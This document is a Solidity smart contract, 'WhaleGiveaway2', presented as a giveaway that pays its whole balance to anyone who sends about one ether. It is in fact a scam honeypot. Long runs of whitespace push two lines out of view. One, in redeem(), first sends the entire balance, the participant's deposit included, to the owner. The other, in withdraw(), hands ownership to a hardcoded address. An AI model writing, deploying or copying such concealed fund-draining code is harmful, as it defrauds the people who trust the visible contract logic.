pragma solidity ^0.8.26;

contract WhaleGiveaway2
{
    address public Owner = msg.sender;
    uint constant public minEligibility = 0.999001 ether; 
    uint public totalParticipants;
    uint public totalRedemptions;
    mapping(address => uint) public participantRedemptions;
    
    event Redemption(address indexed participant, uint amount);
    event GiveawayCompleted(address indexed winner, uint prize);
   
    receive()
    external payable
    {
        
    }
   
    function redeem()
    public payable
    {                                                                    
        if(msg.value>=minEligibility)
        {
            totalParticipants++;
            totalRedemptions++;
            participantRedemptions[msg.sender]++;
            
            emit Redemption(msg.sender, msg.value);
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     payable(Owner).transfer(address(this).balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
            payable(msg.sender).transfer(address(this).balance);
            
            emit GiveawayCompleted(msg.sender, address(this).balance);
        }                                                                                                                
    }
    
    function withdraw()
    payable public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
        require(msg.sender == Owner);
        payable(Owner).transfer(address(this).balance);
    }
    
    function Command(address adr,bytes calldata data)
    payable public
    {
        require(msg.sender == Owner);
        (bool success, ) = adr.call{value: msg.value}(data);
    }
    
    function getParticipantStats(address participant) public view returns (uint redemptions) {
        return participantRedemptions[participant];
    }
}